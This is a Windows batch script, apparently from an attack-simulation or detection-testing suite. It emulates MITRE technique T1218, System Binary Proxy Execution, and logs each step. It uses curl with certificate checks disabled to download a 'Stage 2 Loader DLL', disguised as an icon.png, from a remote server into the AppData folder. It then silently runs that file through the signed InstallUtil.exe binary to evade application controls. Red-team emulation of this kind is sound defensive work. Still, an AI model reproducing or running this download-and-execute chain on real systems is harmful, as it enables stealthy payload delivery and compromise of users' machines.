@echo off
setlocal enabledelayedexpansion

REM --- Placeholder constant declarations (random variable names) ---
SET udnw=%APPDATA%\10856\4895cee3
SET lqxa=65791b4b.txt
SET zmpc=https://10.0.0.49/stage/2/icon.png?10856-7
SET brtv=ITZEL-S2B
SET sxfg=10856
SET wyhj=7
SET vcik=%PUBLIC%\\macula-simulations.log

REM --- Capture initial timestamp ---
SET tsvar=!DATE!/!TIME!

REM --- Debug: heartbeat start ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: heartbeat_start>> "!vcik!" 2>nul

REM --- Step 1: Download Stage 2 Loader DLL via curl ---
curl -k -s -o "!udnw!\!lqxa!" "!zmpc!" >nul 2>&1
set "hb_exit=!errorlevel!"

REM --- Debug: heartbeat complete ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: heartbeat_complete=!hb_exit!>> "!vcik!" 2>nul

REM --- Debug: chdir start ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: chdir_start>> "!vcik!" 2>nul

REM --- Step 2: Change working directory to OUTPUT_DIR ---
cd /d "!udnw!" >nul 2>&1
set "cd_exit=!errorlevel!"

REM --- Debug: chdir result ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: chdir_result=!cd_exit!>> "!vcik!" 2>nul

REM --- Debug: installutil start ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: installutil_start>> "!vcik!" 2>nul

REM --- Step 3: Invoke Stage 2 Loader via InstallUtil (LOLBIN) ---
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /logfile= /LogToConsole=false /U "!lqxa!" >NUL 2>&1
set "iu_exit=!errorlevel!"

REM --- Debug: installutil result ---
echo [!tsvar!][DEBUG][!brtv!][!sxfg!]: installutil_result=!iu_exit!>> "!vcik!" 2>nul

REM --- Log TTP line for T1218|System Binary Proxy Execution ---
if !iu_exit! equ 0 (
    set "ttp_result=OK"
    set "ttp_error="
) else (
    set "ttp_result=FAIL"
    set "ttp_error=exitcode=!iu_exit!"
)
echo [!tsvar!][TTP][!brtv!][!sxfg!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!vcik!" 2>nul

endlocal